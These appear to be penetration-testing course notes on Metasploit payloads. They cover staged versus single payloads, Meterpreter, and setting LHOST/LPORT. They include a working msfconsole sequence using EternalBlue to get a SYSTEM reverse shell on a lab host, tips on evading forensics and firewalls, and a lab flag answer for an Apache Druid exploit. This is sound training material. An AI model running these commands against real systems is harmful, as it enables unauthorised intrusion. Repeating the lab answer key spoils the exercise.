# NOTES — Payloads

## ID
605

## Module
Using the Metasploit Framework

## Kind
notes

## Title
Section 6 — Payloads

## Description
Singles vs Stagers + Stages, Meterpreter overview, selecting/filtering payloads with `grep`, and the LHOST/LPORT/RHOSTS configuration workflow demonstrated against MS17-010 EternalBlue + Apache Druid (lab).

## Tags
metasploit, payloads, meterpreter, staged-payloads, reverse-tcp, bind-tcp, lhost, lport

## Commands
- `show payloads`
- `grep meterpreter show payloads`
- `grep -c meterpreter show payloads`
- `grep meterpreter grep reverse_tcp show payloads`
- `set payload <no.>`
- `set LHOST <ip>` / `set LPORT <port>`
- `set RHOSTS <ip>`
- `ifconfig`
- `run`

## What This Section Covers
A **payload** is the code that runs on the target *after* the exploit lands. MSF payloads come in three flavors — Single, Stager, and Stage. The `/` in the payload name tells you the type at a glance.

## Single vs Stager vs Stage
| Type | What it is | Marker |
|------|------------|--------|
| **Single** | Self-contained payload — exploit + full shellcode | `windows/shell_bind_tcp` (no slash before final segment) |
| **Stager** | Tiny code that opens a comms channel back to attacker | `windows/shell/bind_tcp` (slash present) |
| **Stage** | Larger payload (Meterpreter, VNC) downloaded over that channel | Pairs with a stager |

Stagers are kept tiny and reliable; stages add the heavy capability (no size limit). Metasploit auto-picks the best stager and falls back if needed.

### Windows NX vs No-NX Stagers
- NX stagers are bigger (use `VirtualAlloc`) but work on CPUs with DEP enabled.
- Default is now **NX + Win7 compatible**.

### Staged Payload Reverse Connection
- **Stage0** = initial shellcode the exploit sends. Its job is to open a reverse connection back to the attacker (`reverse_tcp`, `reverse_https`, `bind_tcp`).
- After channel is up, attacker sends **Stage1** (the big payload, usually Meterpreter).
- Reverse connections beat bind shells through firewalls — outbound traffic is more trusted than inbound.

## Meterpreter Payload
Multi-faceted, extensible. Uses **DLL injection** to keep the connection stable and hard to detect. Lives **entirely in memory** — no disk writes — so conventional forensics miss it. Plugins (e.g. GentilKiwi Mimikatz) load/unload at runtime.

## Finding the Right Payload
`show payloads` lists everything (~500+) — too much to scroll. Use `grep` as a pipe inside msfconsole:

```
grep meterpreter show payloads                          # filter by keyword
grep -c meterpreter show payloads                       # count matches
grep meterpreter grep reverse_tcp show payloads         # chain greps
```

`set payload <no.>` selects by index. After selection, `show options` reveals the payload's own options (LHOST, LPORT, EXITFUNC).

## Configuring LHOST / LPORT / RHOSTS
| Param | Side | Meaning |
|-------|------|---------|
| `RHOSTS` | Exploit | Target IP(s) |
| `RPORT` | Exploit | Target service port (e.g. 445 for SMB) |
| `LHOST` | Payload | **Attacker** IP — where the reverse connection lands |
| `LPORT` | Payload | Attacker listen port (default 4444) |

Find your attacker IP without leaving msfconsole:
```
ifconfig
```
Then `set LHOST <your-ip>` (or `set LHOST tun0` to bind to the HTB VPN interface).

## Common Windows Payloads
| Payload | Description |
|---------|-------------|
| `generic/shell_bind_tcp` | Generic shell, bind TCP |
| `generic/shell_reverse_tcp` | Generic shell, reverse TCP |
| `windows/x64/exec` | Run an arbitrary command |
| `windows/x64/loadlibrary` | Load an arbitrary x64 library |
| `windows/x64/messagebox` | Pop a MessageBox |
| `windows/x64/shell_reverse_tcp` | Inline reverse TCP shell |
| `windows/x64/shell/reverse_tcp` | Staged reverse TCP shell |
| `windows/x64/shell/bind_ipv6_tcp` | Staged IPv6 bind shell |
| `windows/x64/meterpreter/<...>` | Meterpreter stager+stage variants |
| `windows/x64/powershell/<...>` | Interactive PowerShell session |
| `windows/x64/vncinject/<...>` | VNC Server via reflective injection |

## End-to-End Example — EternalBlue + Meterpreter Reverse TCP
```
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
grep meterpreter grep reverse_tcp show payloads
set payload 15                                  # windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.15
set RHOSTS 10.10.10.40
run

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

`whoami` doesn't work inside Meterpreter — use `getuid`. Drop into a Windows shell with `shell` to get the normal CMD prompt (this opens a channel; the channel number prints).

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Exploit the Apache Druid service and read `flag.txt`. | **HTB{MSF_Expl01t4t10n}** | `search Apache Druid` → `use 0` (`exploit/linux/http/apache_druid_js_rce`) → `set LHOST tun0` → `set RHOSTS <ip>` → `exploit` → `cat /root/flag.txt` |

## Key Takeaways
- The `/` in a payload name is the type indicator: `windows/shell_bind_tcp` (single) vs `windows/shell/bind_tcp` (stager + stage).
- After picking an exploit, **then** `show payloads` filters to OS-compatible ones automatically.
- Use `grep` *inside* msfconsole to slice long payload lists — it's piped like shell grep but reads msfconsole command output.
- Reverse_tcp through outbound rules is your default; switch to `reverse_https` when you need to look like normal web traffic.

## Gotchas
- `set LHOST tun0` (interface name) instead of a literal IP — MSF resolves the interface IP automatically, which is robust if VPN IPs rotate.
- `LPORT 4444` collides with itself if you're running two listeners — change it (e.g. to `1337` or `9001`) before launching a second exploit while a session is open.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|using-the-metasploit]]
← [[05-targets]] | [[07-encoders]] →
<!-- AUTO-LINKS-END -->
